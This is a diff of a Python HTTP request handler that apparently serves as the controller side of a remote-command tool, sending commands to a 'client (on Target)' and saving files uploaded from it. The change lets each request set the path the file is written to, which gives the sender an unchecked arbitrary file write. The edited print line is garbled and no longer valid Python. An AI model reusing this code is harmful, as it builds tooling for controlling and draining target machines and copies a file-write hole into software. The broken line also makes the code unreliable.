@@ -18,9 +18,9 @@ class MyHandler(BaseHTTPRequestHandler):
 
     def save_file(self, length):
         data = parse_qs(self.rfile.read(length).decode())
-        with open('/tmp/downloaded_file','wb') as output_file:
+        with open("{}".format(data['path'][0]),'wb') as output_file:
             output_file.write(data["rfile"][0].encode())
-        print("File saved as /tmp/downloaded_file")
+        print("File saved as {}".format(data['path'][0]))le")
 
     # Send command to client (on Target)
     def do_GET(self):
